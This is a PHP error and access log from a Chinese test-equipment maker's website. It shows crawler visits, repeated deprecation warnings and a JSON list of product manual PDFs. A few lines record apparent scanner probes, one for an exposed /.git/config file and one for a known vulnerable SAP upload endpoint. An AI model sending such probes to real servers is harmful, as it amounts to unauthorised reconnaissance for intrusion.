[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T18:48:12+08:00 ] 167.94.138.196 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T18:48:16+08:00 ] 167.94.138.196 GET 120.24.147.77/5r8by186r469t
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T18:48:16+08:00 ] 167.94.138.196 GET 120.24.147.77/5r8by186r469t
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T18:57:24+08:00 ] 52.167.144.229 GET www.punalei.cn/ldcms/xiazaizhongxin.html?type=3&name=%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ download ] 3
---------------------------------------------------------------
[ 2026-03-18T18:57:24+08:00 ] 52.167.144.229 GET www.punalei.cn/ldcms/xiazaizhongxin.html?type=3&name=%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE
[ download ] [{"id":242,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":244,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":260,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":262,"title":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20260309\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":263,"title":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":264,"title":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":268,"title":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":270,"title":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/405841dc3a1790083cdfb28d392a51b6.pdf","agreement":"","drive":"","resource":""},{"id":271,"title":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/88bebf25cc9f75277abfb9945aa00ebc.pdf","agreement":"","drive":"","resource":""},{"id":272,"title":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/4eeb7970b89981df90d0560b8dbe2ff8.pdf","agreement":"","drive":"","resource":""},{"id":290,"title":"\u4ea4\u6d41\u6052\u6d41\u6e90","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":291,"title":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":295,"title":"\u5c0f\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":298,"title":"\u533b\u7528\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eea","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":299,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66763U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":300,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 10kw-15kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":303,"title":"\u5b89\u89c4\u7efc\u5408\u6821\u51c6\u70b9\u68c0\u5de5\u88c5","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":304,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea5KV\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":306,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":307,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":308,"title":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":309,"title":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":311,"title":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":312,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":314,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":315,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/7c63757a23e5e98e594bf1b4bf50445a.pdf","agreement":"","drive":"","resource":""},{"id":316,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":317,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":318,"title":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":319,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/29f9570871ea60e153dce0b05698a13e.pdf","agreement":"","drive":"","resource":""},{"id":320,"title":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/d94e60f7d79a2b3b6d9b106bf787c6db.pdf","agreement":"","drive":"","resource":""},{"id":321,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66764U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":322,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66765U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":323,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667620K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":324,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667640K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":325,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667660K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":326,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 20kw-30kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":327,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 40kw-60kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":328,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 75kw-90kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":329,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-U \u9ad8\u538b\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":330,"title":"\u4ea4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/18ff267d1dc26e503128741d78be61d7.pdf","agreement":"","drive":"","resource":""},{"id":331,"title":"\u4ea4\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/04725819a3c60dff3e1af918dc2ccaf2.pdf","agreement":"","drive":"","resource":""},{"id":332,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/639e5850541f700cdc64053f1d7a18a7.pdf","agreement":"","drive":"","resource":""},{"id":333,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":337,"title":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"title":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T18:57:24+08:00 ] 52.167.144.229 GET www.punalei.cn/ldcms/xiazaizhongxin.html?type=3&name=%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE
[ download ] []
---------------------------------------------------------------
[ 2026-03-18T18:58:57+08:00 ] 40.77.167.30 GET www.punalei.cn/ldcms/zhiliudianyuanshumaxilie/329.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T19:12:41+08:00 ] 8.216.38.6 GET 120.24.147.77/.git/config
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T19:15:47+08:00 ] 68.183.238.42 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T19:28:00+08:00 ] 159.89.88.188 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T19:32:45+08:00 ] 45.33.14.197 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T19:33:05+08:00 ] 45.79.172.21 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T19:34:51+08:00 ] 185.12.59.118 GET 120.24.147.77/Dr0v
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T19:34:51+08:00 ] 185.12.59.118 GET 120.24.147.77/Dr0v
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T19:43:12+08:00 ] 52.167.144.217 GET www.punalei.cn/ldcms/gonglvfenxiyichanpin.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T19:47:38+08:00 ] 52.167.144.225 GET www.punalei.cn/ldcms/jiaoliubianpindianyuan/316.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T19:53:09+08:00 ] 40.77.167.19 GET www.punalei.cn/ldcms/xiaogongshuaizhiliudianzifuzaiPNLxilie.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T19:56:25+08:00 ] 20.121.46.26 GET 120.24.147.77/developmentserver/metadatauploader
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T19:56:25+08:00 ] 20.121.46.26 GET 120.24.147.77/developmentserver/metadatauploader
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T20:00:51+08:00 ] 198.235.24.249 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
